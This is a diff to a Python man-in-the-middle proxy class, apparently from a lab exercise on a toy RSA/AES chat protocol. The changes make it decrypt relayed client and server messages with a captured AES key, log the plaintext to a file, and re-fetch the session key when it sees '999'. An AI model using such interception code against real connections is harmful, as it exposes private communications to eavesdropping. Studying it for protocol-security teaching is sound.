@@ -67,12 +67,6 @@ class Mitm:
 		self.begin_loop()
 
 
-#	def send_aes(self):
-#		# send aes
-#		msg = rsa.encrypt(self.key, self.pub_cl)
-#		self.sock_cl.sendall(msg)
-
-
 	def handle_client(self, client):
 		# get public rsa
 		try:
@@ -97,28 +91,35 @@ class Mitm:
 		outputs = [ client.sock, client.sock_to_server ]
 		
 		while True:
-			try:
-			
+			try:			
 				readable, writable, exceptional = select.select(inputs, outputs, inputs)
-				
-				if not readable:
-					continue
 					
 				if client.sock in readable:	  
 					# if client sends	  
 					data = client.sock.recv(MSGLEN).strip(b'\r\n')
-					with open("log.txt", "a+") as f:
-						msg = client.aes.decrypt(data).decode('latin-1')
-						f.write(msg)
-					client.sock_to_server.sendall(data)
+					msg = client.aes.decrypt(data).decode('latin-1')
+					if msg:
+						with open("log.txt", "a+") as f:
+							f.write('client:')
+							f.write(msg)
+							f.write('\n\n')
+							print('Client message:', msg)
+						client.sock_to_server.sendall(data)
 					
-				else:
+				elif client.sock_to_server in readable:
 					# if server sends
 					data = client.sock_to_server.recv(MSGLEN).strip(b'\r\n')
-					with open("log.txt", "a+") as f:
-						msg = client.aes.decrypt(data).decode('latin-1')
-						f.write(msg)
-					client.sock.sendall(data)
+					msg = client.aes.decrypt(data).decode('latin-1')
+					if msg:
+						with open("log.txt", "a+") as f:
+							f.write('server:')
+							f.write(msg)
+							f.write('\n\n')
+							print('Server message:', msg)
+						client.sock.sendall(data)
+						if msg == '999':
+							client.retrieve_session_key(self.priv)
+					
 			except Exception as e:
 				print(e)
 				
@@ -143,8 +144,3 @@ if __name__ == '__main__':
 
 	Mitm(IP, PORT)
 	
-	
-	
-	# if msg == 999, then wait for new session
-
-
